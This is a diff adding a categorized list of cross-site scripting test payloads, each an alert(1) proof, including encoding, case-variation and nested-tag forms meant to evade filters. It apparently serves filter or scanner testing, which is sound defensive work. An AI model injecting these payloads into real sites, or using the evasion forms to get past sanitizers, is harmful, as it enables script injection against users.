@@ -1,0 +1,54 @@
+# Category: basic_script
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script type="text/javascript">alert(1)</script>
+<script language="javascript">alert(1)</script>
+
+# Category: img_tags
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<img src=`x` onerror=`alert(1)`>
+
+# Category: svg_tags
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&#40;1&#41;</script></svg>
+
+# Category: event_handlers
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<div onmouseover=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+
+# Category: iframe_tags
+<iframe src=javascript:alert(1)>
+
+# Category: media_tags
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# Category: javascript_uri
+javascript:alert(1)
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+
+# Category: encoding
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+%3Cscript%3Ealert(1)%3C/script%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+# Category: case_variation
+<Script>alert(1)</Script>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+
+# Category: obfuscation
+<scr<script>ipt>alert(1)</scr</script>ipt>
